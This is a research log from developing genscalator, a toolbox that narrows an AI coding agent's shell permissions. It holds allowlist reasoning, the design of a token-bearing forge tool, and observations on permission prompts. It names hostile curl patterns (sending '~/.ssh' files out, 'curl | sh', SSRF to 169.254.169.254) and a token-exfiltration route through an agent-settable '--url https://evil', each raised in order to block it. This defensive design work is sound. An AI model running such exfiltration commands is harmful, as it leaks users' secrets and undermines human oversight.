# WR data — genscalator self-development

**WR = Workflow Research** (see [`README.md`](README.md) for the thesis + field schema). Confirmation
events recorded while developing genscalator *itself* — dogfooding: building the toolbox surfaces the same
dynamic-shell friction the toolbox exists to remove.

|------|---------|--------|--------------------------|--------------|----------------------|--------|
| 2026-06-27 | genscalator self-dev | Verify the `tt text grepr` change: run 3 cases (multi-ext, single-ext back-compat, bad-dir) and check the exit code | `echo "=== …"; scala-cli run …/text.scala -- grepr … ; echo "=== …"; scala-cli run … ; echo "exit=$?"` | `;`-chained compound + multiple `echo` headers + `$?` — each `scala-cli run` alone matches `Bash(scala-cli run *)`, but the bundle is **not statically allowlistable**, so it prompts | (1) **rule**: one bare `scala-cli run …` per call — no `echo`/`;`/`$?` scaffolding (the violation was mine: AGENTS.md already says this). (2) **tool**: the roadmapped **run-and-verify driver** — a typed `tt` tool taking `tool + args + expected` that runs it and prints pass/fail, collapsing the echo+run+check bundle into one allowlistable call | rule (+ tool idea → roadmap) |
| 2026-07-03 | genscalator self-dev | Check Codeberg release state (to align PRD versioning) — query the releases API + list remote tags | `curl -s "https://codeberg.org/api/v1/repos/bjornregnell/genscalator/releases?limit=50"` | The call itself was a low-risk **read-only GET to a public API**, but the *category* is not safe: a `Bash(curl *)` allowlist entry blanket-approves every dual-use `curl` — **exfiltrate secrets** (`-d @~/.ssh/…`), **RCE** (`curl … \| sh`), **SSRF** (`169.254.169.254`, `localhost`), credential headers, uploads. **"This call was safe" ≠ "the allowlist rule is safe."** curl is a textbook BHH-BadGoal vector (controlHumanSystem / exfiltrateSecrets / persistence). | (1) **`tt web get <url>`** — safe read-only HTTP: **GET only** (no POST/PUT/upload), no credential/cookie headers, **size cap**, optional **`--host` allowlist**, no shell → `Bash(tt web get *)` is blanket-allowable while bare `curl` stays OUT of the allowlist. (2) **`tt forge <verb>`** — Codeberg/Gitea domain tool (releases/tags list + create-release) for the recurring need this event exposed; the create path is effectful → `--audit`, human-owned token via env (cf. `TT_VERIFY_ALLOW`, `configInArgsNotEnv`). | candidate (WR-TOOL) |

## Narrative
This event is a clean instance of WR flavour #2 from the introprog case study
([`introprog-autotranslate.md`](introprog-autotranslate.md)): **the bundling itself is the prompt cause**,
not any single command. Twist worth noting — it happened *inside genscalator development*, where the
one-bare-command discipline is literally documented in `AGENTS.md`; momentum still re-introduced the
scaffolding stack. Evidence that command-hygiene needs to be **frictionless/reflexive**, not just written
down. It also adds a concrete data point in favour of building the roadmapped **run-and-verify driver**:
verifying a tool's behaviour is a recurring need that currently invites an `echo`+`;`+`$?` bundle.

**Update (v0.7.0):** the run-and-verify driver shipped as **`tt verify`** — one allowlistable call that runs
an allowed command (no shell), checks exit/stdout/stderr, and prints PASS/FAIL. This closes the candidate:
the `echo`+`;`+`$?` bundle is now replaced by `tt verify --exit 0 --out … -- <cmd>`. The friction event →
tool loop, end to end.

### Wiring a real token — two findings (2026-07-03, dogfooding `tt forge` to cut the v0.8.0 release)

**Finding A — a human-set env secret is INVISIBLE to the agent's non-interactive shell.** BR's Codeberg
token lives in `~/.bashrc` as `GENSCALATOR_CODEBERG_TOKEN`. The agent's Bash tool runs a **non-interactive**
shell, and Ubuntu's stock `.bashrc` starts with an interactive-guard (`case $- in *i*) ;; *) return;;`) that
`return`s *before* the export — so the var was simply **absent**, and `tt forge` correctly refused. Workaround
that worked: wrap the call in **`bash -ic '…'`** (force interactive → `.bashrc` sources → export runs), token
never touching the command line. **Insight:** the `configInArgsNotEnv` trust-boundary (human-only secrets in
env) has a *delivery gap* — the agent's default shell may not load the human's env. This is a **coupled-system
substrate** issue (the secret is on the substrate, but not on the layer the agent's shell reads). **Root
cause here:** the export was added to `~/.bashrc` *after* the `claude` process launched — env is captured at
process start, so a live process never sees a later `.bashrc` edit. Options, cleanest first:
(a) **PREFERRED — relaunch the agent from an env that already carries the secret:** exit + `claude --resume`
from a terminal where the export has run; the agent process inherits it and ALL child Bash shells inherit it
for free (no guard issue, no per-call trick). Env *inheritance* beats per-call sourcing. **CONFIRMED
(2026-07-03):** attempt 1 failed (BR forgot to `source ~/.bashrc` first → token absent; caught by the
`tt forge whoami` first-action check — safety net working); attempt 2, after sourcing, `tt forge whoami`
returned `authenticated as bjornregnell … (token from env GENSCALATOR_CODEBERG_TOKEN)` and effectful forge
ops now run BARE. Cross-ref [[exit-resume-dance]]. (b) per-call
**`bash -ic '…'`** (force interactive → `.bashrc` sources → export runs) — the in-session workaround when
relaunching isn't worth it (what we used tonight). (c) human exports the secret above the interactive-guard
or in a profile the agent's non-interactive shell loads. Candidate: an AGENTS/tool note on "human-env secrets
+ the non-interactive-shell gap → relaunch to inherit, or `bash -ic` in a pinch."

**Finding B — a real credential exposed a safe-by-design hole: token exfil via an agent-settable `--url`.**
Once a token flows, `tt forge release-create <repo> <tag> --url https://evil` would POST that token as an auth
header to an attacker host. Fix (committed `aa9eadf`): the token is read ONLY from a **fixed** set of env-var
names (`GENSCALATOR_CODEBERG_TOKEN`, `CODEBERG_TOKEN`, `FORGE_TOKEN`) — *not* an agent-nameable var — AND a
**trusted-host guard** pins the destination (default `codeberg.org`, human-extends via env `TT_FORGE_HOSTS`).
**General rule for any tokened tool:** a credential-bearing effectful tool has TWO exfil surfaces beyond the
token *source* — (1) *which* secret (the env-var name) and (2) *where* it is sent (the host). Both must be
**human-pinned, never agent-controllable**. (verify pinned the executable; forge must pin the secret-name AND
the destination host.) — Dogfood note: the release itself was cut with this very tool → the curl-reflex →
`tt forge` WR-TOOL loop is closed end-to-end.

### Permission-model observations — the guard calibrating *well* (2026-07-03, BR)
Two positive data points (not friction — evidence the confirmation model is well-placed, the flip side of the CF hazard):
- **Version/capability probes (`gh --version`, `tea --version`) should be safe** — read-only, no side effects, just capability detection. Candidate: **allowlist the *specific* binaries we probe** (`gh`, `tea`, `scala-cli`, `scalex`, `tt`) for `--version`/`--help`. CAVEAT: a blanket `Bash(* --version)` is **not** strictly safe — it still *executes an arbitrary binary*, and a malicious `foo` can ignore `--version` and do anything. So narrow per-binary probe entries, not a universal wildcard. (Safe-by-design principle: the *rule* must be provably safe, not just the intended call — same lesson as the curl entry below.)
- **Reading OUTSIDE the allowed working dirs correctly prompted** (`/etc/os-release`), and BR judged the prompt **appropriate** — a meaningful boundary crossing, not rubber-stamp noise. Positive signal that the **directory-scope guard is well-calibrated**: it fires on genuine out-of-tree access (where the human *wants* a say) without drowning in-tree work in prompts. This is the *good* end of the CF spectrum — few, meaningful approvals — that safe-by-design aims for.
- **NEGATIVE counterpart — the "allow all edits" affordance reads as scary (2026-07-03, BR).** On a first edit prompt, the accept-all choice is worded **"Yes, allow all edits during this session (shift+tab)"**. BR flagged the wording as **alarming**: *"all"* is unbounded — does it include files **outside this repo** (`~/.ssh`, keyring, dotfiles)? The label doesn't disclose the **blast radius**, so the cautious human declines and keeps clicking. **Ask surfaced:** offer a **scoped** grant — *"allow all edits **in this repo/dir** this session"* — so the human can grant frictionlessly *without* signing a blank cheque. A *coarse* affordance pushes users to either rubber-stamp (CF-collapse) or prompt forever (CF-fatigue); a **directory-scoped** grant is the safe-by-design middle. **Perception gap:** edits ARE dir-scoped by the working-dir guard in practice — the guard is *safer than its own UI label admits*; the fix is mostly **wording** (state the scope) + optionally a genuinely repo-scoped accept.

### curl / HTTP GET → `tt web` + `tt forge` (2026-07-03)
A different WR flavour: not a *bundling* prompt but a **dual-use-binary allowlisting** hazard. Fetching a
public API with `curl` is fine *as a call*, but the safe-by-design question is about the **allowlist rule**,
not the call: `Bash(curl *)` would approve exfiltration (`-d @secret`), `curl | sh` RCE, and SSRF to
internal hosts. The genscalator answer is the usual one — **replace the un-allowlistable dual-use tool with
a narrow typed tool that declares its effects**: `tt web get` (read-only, capped, host-allowlistable) for the
generic case, and `tt forge` (Gitea/Codeberg releases/tags) for the domain need that surfaced here (creating
the missing v0.8.0 release without hand-curling a token). Same pattern as `tt verify` replacing the
`cd && … > log; echo $?` bundle: a bare binary the guard can't prove safe → a typed command it can.

### Notation rename `L → Z` + `RAW-DATA.md` made append-only (2026-07-03, BR)
Not a friction event — a **vocabulary + data-integrity** decision, logged here (the hand-authored WR home) per
BR's instruction to *"note a new WR-DATA note that we changed the name"* rather than patch the raw log. The
smart-zone ceiling symbol **L** was renamed **Z** ("smart-**Z**one ceiling"; BR's rationale: there are two
zones, and a lone `Z` *stands out* and reads as sitting **between** smart and dumb, where a lone `L` was noise).
Applied repo-wide — **except [`RAW-DATA.md`](../RAW-DATA.md)**, which BR simultaneously declared **append-only**:
raw datapoints are **never** retro-edited or "fixed"; a change of mind is logged as **new** data, because
*"humans change their mind and that's also data."* Clean statement of a research-integrity invariant to keep:
**the raw log is immutable; corrections are forward-only.** Meta worth keeping: the agent's reflex was *"just
fix all the L's everywhere for consistency"* — BR's guard against retro-editing the *raw* log is exactly the
discipline that keeps the study honest. **Consistency pressure vs. evidentiary integrity — on raw data,
integrity wins.** (The rename itself was safe to do everywhere else: those are *living* docs, not evidence.)
